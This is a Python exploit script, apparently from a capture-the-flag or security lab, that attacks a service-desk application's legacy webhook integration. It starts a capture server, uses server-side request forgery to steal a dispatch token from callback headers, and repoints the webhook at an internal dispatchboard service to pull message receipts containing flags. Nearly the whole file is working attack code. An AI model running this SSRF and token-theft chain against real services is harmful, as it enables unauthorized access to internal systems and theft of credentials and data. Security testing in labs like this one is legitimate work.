import argparse
import json
import re
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

import requests

from _common import auth_headers, create_ticket, info, ok, register_or_login


TARGET_MARKER = "FLAG_VULN1_message_body_"
_RAW_RECEIPT_RE = re.compile(
    r'"reference":"(?P<reference>[^"]+)","event_type":"ticket\.message\.created",'
    r'"body_preview":"(?P<body_preview>[^"]*FLAG_VULN1_message_body_[^"]*)"',
)


class CaptureState:
    def __init__(self) -> None:
        self.dispatch_token: str | None = None
        self.event = threading.Event()
        self.last_headers: dict[str, str] | None = None


class CaptureHandler(BaseHTTPRequestHandler):
    state: CaptureState | None = None

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        self.rfile.read(length) if length else None
        assert CaptureHandler.state is not None
        CaptureHandler.state.last_headers = dict(self.headers)
        CaptureHandler.state.dispatch_token = self.headers.get("X-ServiceDesk-Dispatch-Token")
        CaptureHandler.state.event.set()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"captured")

    def log_message(self, fmt: str, *args):
        return


def start_capture(bind_host: str, bind_port: int) -> tuple[CaptureState, HTTPServer]:
    state = CaptureState()
    CaptureHandler.state = state
    server = HTTPServer((bind_host, bind_port), CaptureHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return state, server


def main():
    ap = argparse.ArgumentParser(
        description="Vuln 1: SSRF via legacy webhook_url -> steal dispatch token -> read receipts"
    )
    ap.add_argument("--base", default="http://localhost:8080")
    ap.add_argument("--bind-host", default="0.0.0.0", help="where the capture server listens")
    ap.add_argument("--bind-port", type=int, default=9011)
    ap.add_argument(
        "--callback-host",
        default="host.docker.internal",
        help="host the service-desk container uses to reach the capture server "
             "(host.docker.internal on default compose setup)",
    )
    ap.add_argument("--callback-port", type=int, default=9011)
    args = ap.parse_args()

    username, token = register_or_login(args.base, prefix="red_v1")
    ok(f"registered attacker {username}")

    cover = create_ticket(args.base, token, title="ssrf cover", description="dummy")
    cover_id = cover["id"]
    ok(f"created cover ticket {cover_id}")

    state, server = start_capture(args.bind_host, args.bind_port)
    info(f"capture server listening on {args.bind_host}:{args.bind_port}")

    try:
        webhook_capture = f"http://{args.callback_host}:{args.callback_port}/capture"
        info("using legacy webhook_url compatibility path; split base_url/endpoint_path is not public here")
        r = requests.post(
            f"{args.base}/api/integrations",
            headers=auth_headers(token),
            json={
                "name": "capture",
                "webhook_url": webhook_capture,
                "ticket_id": cover_id,
            },
            timeout=10,
        )
        r.raise_for_status()
        integration_id = r.json()["id"]
        ok(f"created integration {integration_id} pointing at {webhook_capture}")

        r = requests.post(
            f"{args.base}/api/integrations/{integration_id}/trigger",
            headers=auth_headers(token),
            timeout=10,
        )
        r.raise_for_status()
        info(f"leg 1 trigger status: {r.json().get('status_code')}")

        if not state.event.wait(timeout=10):
            info("capture server never received the callback. check --callback-host.")
            sys.exit(3)

        token_hdr = state.dispatch_token
        if not token_hdr:
            info("no dispatch token in callback headers")
            info(f"received headers: {json.dumps(state.last_headers, indent=2)}")
            sys.exit(3)
        ok(f"captured dispatch token: {token_hdr}")

        dispatch_url = f"http://dispatchboard:8081/dispatch/{token_hdr}/receipts"
        r = requests.patch(
            f"{args.base}/api/integrations/{integration_id}",
            headers=auth_headers(token),
            json={"webhook_url": dispatch_url},
            timeout=10,
        )
        r.raise_for_status()
        ok("repointed integration at dispatchboard receipts endpoint")

        r = requests.post(
            f"{args.base}/api/integrations/{integration_id}/trigger",
            headers=auth_headers(token),
            timeout=10,
        )
        r.raise_for_status()
        body_str = r.json().get("body") or ""
        info(f"leg 2 trigger status: {r.json().get('status_code')}")

        receipts: list[dict] = []
        flags: list[tuple[str | None, str]] = []
        try:
            receipts_resp = json.loads(body_str)
        except json.JSONDecodeError:
            if TARGET_MARKER not in body_str:
                info(f"body is not JSON and does not contain the target marker: {body_str[:200]}")
                sys.exit(3)
            for match in _RAW_RECEIPT_RE.finditer(body_str):
                flags.append((match.group("reference"), match.group("body_preview")))
            if not flags:
                info(f"body contains target marker but no receipt-shaped match was found: {body_str[:300]}")
                sys.exit(3)
            ok("received truncated receipts preview; extracted flag from raw body")
        else:
            receipts = receipts_resp.get("receipts", [])
            ok(f"received {len(receipts)} receipts")
            for receipt in receipts:
                preview = receipt.get("body_preview") or ""
                if receipt.get("event_type") == "ticket.message.created" and TARGET_MARKER in preview:
                    flags.append((receipt.get("reference"), preview))

        if not flags:
            info("no receipt with matching flag marker found. sample receipts:")
            for receipt in receipts[:5]:
                print(f"  {receipt}")
            sys.exit(2)

        for ref, preview in flags:
            ok(f"flag from message {ref}: {preview}")

    finally:
        server.shutdown()
        server.server_close()


if __name__ == "__main__":
    main()
